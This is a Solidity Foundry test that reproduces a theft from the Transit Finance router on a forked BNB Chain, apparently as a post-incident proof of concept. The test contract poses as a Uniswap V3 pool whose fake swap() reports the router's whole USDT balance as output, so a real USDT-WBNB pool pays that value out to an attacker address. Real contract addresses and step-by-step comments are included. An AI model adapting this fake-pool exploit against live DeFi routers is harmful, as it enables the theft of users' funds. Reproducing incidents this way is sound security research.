//SPDX-License-Identifier:MIT
pragma solidity 0.8.19;

import "forge-std/Test.sol";
import "src/interfaces/ICheatCodes.sol";
import "src/interfaces/IUniswapV3Pool.sol";
import "src/interfaces/IERC20.sol";

struct ExactInputV3SwapParams {
    address srcToken;
    address dstToken;
    address dstReceiver;
    address wrappedToken;
    uint256 amount;
    uint256 minReturnAmount;
    uint256 fee;
    uint256 deadline;
    uint256[] pools;
    bytes signature;
    string channel;
}

interface ITransitRouter{
    function transitFee() external view returns (uint256, uint256);
    function exactInputV3Swap(ExactInputV3SwapParams calldata params) external payable returns (uint256 returnAmount);
}
contract TransitFinanceExploit1223 is Test {

    uint256 bscForkId;
    ICheatCodes cheatCodes = ICheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);

    address transitRouter = 0x00000047bB99ea4D791bb749D970DE71EE0b1A34;
    address pool_usdt_wbnb = 0x36696169C63e42cd08ce11f5deeBbCeBae652050;
    address usdt = 0x55d398326f99059fF775485246999027B3197955;    
    address wbnb = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    address attacker = address(uint160(uint256(keccak256(abi.encode("attacker")))));

    function setUp() external {
        string memory bscRpc = cheatCodes.envString("BSC_RPC_URL");
        bscForkId = cheatCodes.createSelectFork(bscRpc, 34_506_415);

        cheatCodes.label(attacker, "attacker");
        cheatCodes.label(address(this), "fake pool");
        cheatCodes.label(usdt, "USDT");
        cheatCodes.label(wbnb, "Wrapped BNB");
        cheatCodes.label(transitRouter, "Transit Router");
        cheatCodes.label(pool_usdt_wbnb, "UniV3 USDT-WBNB Pool");
    }

    //@note this function attacks the USDT balance in the router contract
    function testTransitExploit() external {

        uint256 ethDeposit = 1;
        cheatCodes.deal(attacker, ethDeposit);

        ITransitRouter transitFinanceRouter = ITransitRouter(transitRouter); 
        uint256[] memory pools = new uint256[](2);
        pools[0] = uint256(uint160(address(this)));
        pools[1] = 452_312_848_583_266_388_373_324_160_500_822_705_807_063_255_235_247_521_466_952_638_073_588_228_176;
        //@note pool_usdt_wbnb address encoded in UniV3 compatible format

        ExactInputV3SwapParams memory v3SwapParams = ExactInputV3SwapParams({
            srcToken: address(0), //@note address(0) is bnb
            dstToken: address(0),
            dstReceiver: attacker,
            wrappedToken: wbnb,
            amount: ethDeposit,
            minReturnAmount: 0,
            fee: 0, // in bps
            deadline: block.timestamp,
            pools: pools,
            signature: bytes(""),
            channel: ""
        });

        IERC20 usdtContract = IERC20(usdt);
        IERC20 wbnbContract = IERC20(wbnb);        
        uint256 routerUSDTBalanceBefore = usdtContract.balanceOf(transitRouter);
        uint256 routerWBnbBalanceBefore = wbnbContract.balanceOf(transitRouter);
        uint256 routerBnbBalanceBefore = transitRouter.balance;        
        uint256 attackerBalanceBefore = attacker.balance;

        cheatCodes.prank(attacker);
        transitFinanceRouter.exactInputV3Swap{value: ethDeposit}(v3SwapParams);

        uint256 routerUSDTBalanceAfter = usdtContract.balanceOf(transitRouter);
        uint256 routerWBnbBalanceAfter = wbnbContract.balanceOf(transitRouter);
        uint256 routerBnbBalanceAfter = transitRouter.balance;                        
        uint256 attackerBalanceAfter = attacker.balance;


        emit log_named_decimal_uint("router WBNB balance before: ", routerWBnbBalanceBefore, 18);
        emit log_named_decimal_uint("router BNB balance before: ", routerBnbBalanceBefore, 18);        
        emit log_named_decimal_uint("router USDT balance before: ", routerUSDTBalanceBefore, 18);
        emit log_named_decimal_uint("attacker balance before: ", attackerBalanceBefore, 18);


        emit log_named_decimal_uint("router WBNB balance after: ", routerWBnbBalanceAfter, 18);
        emit log_named_decimal_uint("router BNB balance after: ", routerBnbBalanceAfter, 18);   
        emit log_named_decimal_uint("router USDT balance after: ", routerUSDTBalanceAfter, 18);        
        emit log_named_decimal_uint("attacker balance after: ", attackerBalanceAfter, 18);
    }

    function token0() external view returns(address)  {
        return wbnb ;
    }

    function token1() external view returns(address)  {
        return usdt;
    }

    //@note used in the router, a dummy implementation
    function fee() external view returns(uint24) {
        return 0;
    } 

    //@note this is the key attack vector
    //@note without any transfers, I am faking a swap that returns entire USDT balance of router
    //@note in the next pool, wbnb-usdt pool executes a swap using this fake USDT value, that is incidentally the entire router USDT balance
    //@note this swapped out wbnb then is naively sent back to the attacker, completing the attack
    function swap(address ,
        bool ,
        int256 ,
        uint160 ,
        bytes calldata 
    ) external returns (int256 amount0, int256 amount1) {

        uint256 routerBalance = IERC20(usdt).balanceOf(transitRouter);
          return (-int256(routerBalance), -int256(routerBalance));
    } 


    receive() external payable {

    } //@note to accept BNB sent back

}


